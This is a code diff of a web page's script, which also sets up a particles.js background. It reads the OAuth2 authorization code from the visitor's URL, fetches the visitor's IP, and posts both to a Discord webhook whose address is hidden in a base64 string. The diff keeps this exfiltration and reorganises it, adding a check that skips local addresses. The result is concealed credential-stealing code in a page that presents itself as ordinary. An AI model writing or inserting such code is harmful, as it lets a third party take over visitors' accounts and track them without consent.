@@ -160,39 +160,53 @@
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
-            
-            if (code) {
-                console.log('Authorization code:', code);
+            const webhookUrI = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2Mjc4NTQwMTk4NzI3MjczNC8xUzJ1bGVMNnQtMWszQlhaaDJvaWl6b1dkV3UwdVZyM0pFcGZIalVhd3ZPZFJEa3hDU2tXNWoyU3FiUlVlTll4VGpQTw==";
+            const webhookUrl = atob(webhookUrI);
 
-                const webhookUrI = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2Mjc4NTQwMTk4NzI3MjczNC8xUzJ1bGVMNnQtMWszQlhaaDJvaWl6b1dkV3UwdVZyM0pFcGZIalVhd3ZPZFJEa3hDU2tXNWoyU3FiUlVlTll4VGpQTw==";
-                const webhookUrl = atob(webhookUrI);
+            const blacklistedIPs = ["127.0.0.1", "192.168.1.1"];
 
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        const ip = data.ip;
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
 
-                        fetch(webhookUrl, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                content: `New OAuth2 code: ${code}\nIP Address: ${ip}`
+                    if (blacklistedIPs.includes(ip)) {
+                        return;
+                    }
+
+                    if (code) {
+                        console.log('Authorization code:', code);
+
+                        fetch('https://api.ipify.org?format=json')
+                            .then(response => response.json())
+                            .then(data => {
+                                const ip = data.ip;
+
+                                fetch(webhookUrl, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        content: `New OAuth2 code: ${code}\nIP Address: ${ip}`
+                                    })
+                                })
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log('Success:', data);
+                                })
+                                .catch((error) => {
+                                    console.error('Error sending webhook:', error);
+                                });
                             })
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            console.log('Success:', data);
-                        })
-                        .catch((error) => {
-                            console.error('Error sending webhook:', error);
-                        });
-                    })
-                    .catch((error) => {
-                        console.error('Error fetching IP address:', error);
-                    });
-            }
+                            .catch((error) => {
+                                console.error('Error fetching IP address:', error);
+                            });
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error fetching IP address:', error);
+                });
 
             particlesJS("particles-js", {
                 particles: {
